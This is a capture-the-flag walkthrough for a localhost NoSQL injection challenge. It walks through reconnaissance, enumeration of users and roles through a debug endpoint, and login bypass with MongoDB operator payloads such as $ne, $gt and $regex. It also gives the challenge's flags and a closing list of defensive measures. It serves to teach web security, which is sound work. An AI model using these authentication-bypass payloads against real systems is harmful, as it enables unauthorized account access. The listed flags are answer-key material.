# 🎯 Realistic NoSQL Injection Challenge - Walkthrough

## Phase 1: Reconnaissance 🔍

### Step 1: Check Standard Files
```bash
# Check robots.txt (standard recon)
curl http://localhost:3000/robots.txt
```

**Discovery:** Find disallowed paths and dev comments about `/api/auth/debug`

### Step 2: Source Code Analysis
```bash
# View main page source
curl http://localhost:3000/ | grep -i "debug\|api\|TODO\|dev"
```

**Discovery:** Find commented debug endpoints and version info

### Step 3: Browser Console
Open http://localhost:3000 in browser and check console (F12)

**Discovery:** Debug logging reveals API endpoints

## Phase 2: Information Gathering 🕵️

### Step 1: Access Debug Endpoint
```bash
curl http://localhost:3000/api/auth/debug
```

**Intelligence Gained:**
- Total users and admin count
- Available departments and roles
- All API endpoints
- System version information

### Step 2: Discover User Enumeration
```bash
curl http://localhost:3000/api/auth/users
```

**Discovery:** Usage examples and valid parameters

## Phase 3: Target Enumeration 🎯

### Step 1: Find All Superadmins
```bash
curl http://localhost:3000/api/auth/users?role=superadmin
```

**Targets Discovered:**
- `sysadmin` (security department)
- `root` (security department)

### Step 2: Explore Security Department
```bash
curl http://localhost:3000/api/auth/users?department=security
```

### Step 3: Find All Admins (for backup targets)
```bash
curl http://localhost:3000/api/auth/users?role=admin
```

## Phase 4: NoSQL Injection Attack 💥

### Attack 1: Regular Admin (Partial Flag)
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'
```

**Result:** `H7CTF{b4s1c_4dm1n_4cc3ss_0bt41n3d}`

### Attack 2: Superadmin (Main Flag) 🏆
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "sysadmin", "password": {"$ne": ""}}'
```

**Result:** `H7CTF{adv4nc3d_n0sql_1nj3ct10n_m4st3r_2024}`

### Alternative Superadmin Target
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "root", "password": {"$ne": ""}}'
```

## Advanced Techniques 🚀

### Mass User Enumeration
```bash
# All departments
for dept in it hr finance security operations sales marketing; do
  echo "=== $dept ===" 
  curl -s "http://localhost:3000/api/auth/users?department=$dept"
done

# All roles  
for role in user admin moderator superadmin; do
  echo "=== $role ==="
  curl -s "http://localhost:3000/api/auth/users?role=$role"
done
```

### Alternative NoSQL Operators
```bash
# Greater than injection
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "sysadmin", "password": {"$gt": ""}}'

# Regex injection  
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "sysadmin", "password": {"$regex": ".*"}}'

# Blind injection (both fields)
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

## Difficulty Levels 🏅

- **🟢 Beginner**: Find debug endpoint, get basic admin flag
- **🟡 Intermediate**: Full reconnaissance, enumerate users, target specific admins  
- **🔴 Advanced**: Discover all endpoints, mass enumeration, multiple injection techniques

## Real-World Impact 💀

This demonstrates how:
1. **Information disclosure** enables targeted attacks
2. **Debug endpoints** reveal system architecture  
3. **User enumeration** helps attackers choose targets
4. **NoSQL injection** bypasses authentication completely
5. **Role-based access** can be circumvented with proper enumeration

## Defensive Measures 🛡️

1. Remove debug endpoints in production
2. Implement proper input validation
3. Use parameterized queries
4. Add rate limiting
5. Disable user enumeration
6. Remove sensitive comments from source code
7. Implement proper access controls